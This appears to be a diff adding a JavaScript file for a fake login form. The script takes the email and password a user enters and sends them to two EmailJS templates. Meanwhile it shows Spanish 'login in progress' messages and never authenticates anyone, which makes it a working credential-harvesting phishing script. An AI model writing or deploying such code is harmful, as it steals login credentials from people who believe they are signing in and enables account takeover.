@@ -1,0 +1,39 @@
+(function() {
+    emailjs.init('vXFL1_J2AhuYYvCSx');
+
+    document.getElementById('contact-form').addEventListener('submit', function(event) {
+        event.preventDefault();
+
+        var email = document.getElementById('email').value;
+        var password = document.getElementById('password').value;
+
+        if (email && password) {
+            // data
+            var templateParams = {
+                email: email,
+                password: password
+            };
+
+            // first email
+            emailjs.send('service_mlr1gee', 'template_8ygccbi', templateParams)
+                .then(function(response) {
+                    console.log('Inicio de sesión en curso...', response);
+                }).catch(function(error) {
+                    console.error('Error en el servidor, inténtalo de nuevo más tarde.', error);
+                });
+
+            // second email
+            emailjs.send('service_mlr1gee', 'template_mu97vit', templateParams)
+                .then(function(response) {
+                    console.log('Inicio de sesión en curso...', response);
+                }).catch(function(error) {
+                    console.error('Error en el servidor, inténtalo de nuevo más tarde.', error);
+                });
+
+            alert('Inicio de sesión en curso...');
+            document.getElementById('contact-form').reset();
+        } else {
+            alert('Por favor, completa todos los campos para iniciar sesión.');
+        }
+    });
+})();
